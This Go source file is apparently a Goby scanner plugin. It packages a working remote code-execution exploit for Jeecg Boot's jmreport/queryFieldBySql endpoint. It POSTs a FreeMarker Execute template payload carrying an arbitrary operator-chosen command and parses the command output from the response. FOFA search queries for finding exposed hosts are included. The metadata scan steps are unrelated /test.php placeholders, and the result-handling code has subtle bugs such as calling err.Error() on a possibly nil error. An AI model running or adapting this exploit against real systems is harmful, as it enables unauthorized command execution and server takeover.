package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Jeecg Boot jmreport/queryFieldBySql interface code execution vulnerability",
    "Description": "<p>Jeecg Boot (or Jeecg-Boot) is an open source enterprise-level rapid development platform based on code generators, focusing on the development of background management systems, enterprise information management systems (MIS) and other applications. It provides a series of tools and templates to help developers quickly build and deploy modern web applications.</p><p>An attacker can manipulate an application's templating engine to execute malicious code or obtain sensitive information. This kind of vulnerability may lead to the compromise of the entire application, causing serious security problems.</p>",
    "Product": "JEECG",
    "Homepage": "http://www.jeecg.com/",
    "DisclosureDate": "2023-08-17",
    "PostTime": "2023-08-18",
    "Author": "1691834629@qq.com",
    "FofaQuery": "title==\"JeecgBoot 企业级低代码平台\" || body=\"window._CONFIG['imgDomainURL'] = 'http://localhost:8080/jeecg-boot/\" || title=\"Jeecg-Boot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || body=\"'http://fileview.jeecg.com/onlinePreview'\" || title==\"JeecgBoot 企业级低代码平台\" || title==\"Jeecg-Boot 企业级快速开发平台\" || title==\"JeecgBoot 企业级快速开发平台\" || title==\"JeecgBoot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || title=\"Jeecg-Boot 快速开发平台\" || body=\"积木报表\" || body=\"jmreport\"",
    "GobyQuery": "title==\"JeecgBoot 企业级低代码平台\" || body=\"window._CONFIG['imgDomainURL'] = 'http://localhost:8080/jeecg-boot/\" || title=\"Jeecg-Boot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || body=\"'http://fileview.jeecg.com/onlinePreview'\" || title==\"JeecgBoot 企业级低代码平台\" || title==\"Jeecg-Boot 企业级快速开发平台\" || title==\"JeecgBoot 企业级快速开发平台\" || title==\"JeecgBoot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || title=\"Jeecg-Boot 快速开发平台\" || body=\"积木报表\" || body=\"jmreport\"",
    "Level": "3",
    "Impact": "<p>attackers manipulate the application's template engine to execute malicious code or retrieve sensitive information. This type of vulnerability can lead to the entire application being compromised, resulting in significant security issues.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.jeecg.com/\">http://www.jeecg.com/</a></p>",
    "References": [
        "https://my.oschina.net/jeecg/blog/10096283"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Jeecg Boot jmreport/queryFieldBySql 接口代码执行漏洞",
            "Product": "JEECG",
            "Description": "<p>Jeecg Boot（或者称为 Jeecg-Boot）是一款基于代码生成器的开源企业级快速开发平台，专注于开发后台管理系统、企业信息管理系统（MIS）等应用。它提供了一系列工具和模板，帮助开发者快速构建和部署现代化的 Web 应用程序。<br>攻击者可以通过操纵应用程序的模板引擎来执行恶意代码或获取敏感信息。这种漏洞可能会导致整个应用程序被入侵，造成严重的安全问题。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.jeecg.com/\" target=\"_blank\">http://www.jeecg.com/</a><br></p>",
            "Impact": "<p>攻击者可以通过操纵应用程序的模板引擎来执行恶意代码或获取敏感信息。这种漏洞可能会导致整个应用程序被入侵，造成严重的安全问题。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Jeecg Boot jmreport/queryFieldBySql interface code execution vulnerability",
            "Product": "JEECG",
            "Description": "<p>Jeecg Boot (or Jeecg-Boot) is an open source enterprise-level rapid development platform based on code generators, focusing on the development of background management systems, enterprise information management systems (MIS) and other applications. It provides a series of tools and templates to help developers quickly build and deploy modern web applications.</p><p>An attacker can manipulate an application's templating engine to execute malicious code or obtain sensitive information. This kind of vulnerability may lead to the compromise of the entire application, causing serious security problems.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.jeecg.com/\" target=\"_blank\">http://www.jeecg.com/</a><br></p>",
            "Impact": "<p>attackers manipulate the application's template engine to execute malicious code or retrieve sensitive information. This type of vulnerability can lead to the entire application being compromised, resulting in significant security issues.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10826"
}`
	doPostRequest0234lsdk := func(hostInfo *httpclient.FixUrl, param string) (*httpclient.HttpResponse, error) {
		requestConfig := httpclient.NewPostRequestConfig("/jeecg-boot/jmreport/queryFieldBySql")
		requestConfig.Header.Store("Content-Type", "application/json")
		requestConfig.FollowRedirect = false
		requestConfig.VerifyTls = false
		requestConfig.Data = param
		response, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil {
			return nil, err
		}
		return response, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			response, err := doPostRequest0234lsdk(hostInfo, `{"sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"dir\")}'"}`)
			if err != nil {
				return false
			}
			return response.StatusCode == 200 && strings.Contains(response.Utf8Html, "fieldName") && strings.Contains(response.Utf8Html, "\"code\":200") && !strings.Contains(response.Utf8Html, `freemarker.template.utility.execute`)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			cmd := goutils.B2S(ss.Params["cmd"])
			if attackType == "cmd" {
				command := `{"sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"` + cmd + `\")}'"}`
				response, err := doPostRequest0234lsdk(expResult.HostInfo, command)
				if err != nil || response.StatusCode != 200 || !strings.Contains(response.RawBody, "fieldList") {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				pattern := `(?m)"fieldText":\s*"([^"]+)"`
				re := regexp.MustCompile(pattern)
				matches := re.FindAllStringSubmatch(response.Utf8Html, -1)
				if len(matches) > 0 || len(matches[0]) > 1 {
					expResult.Success = true
					expResult.Output = matches[0][1]
				} else {
					expResult.Success = false
					expResult.Output = "没有匹配到字段"
				}
			}
			return expResult
		},
	))
}
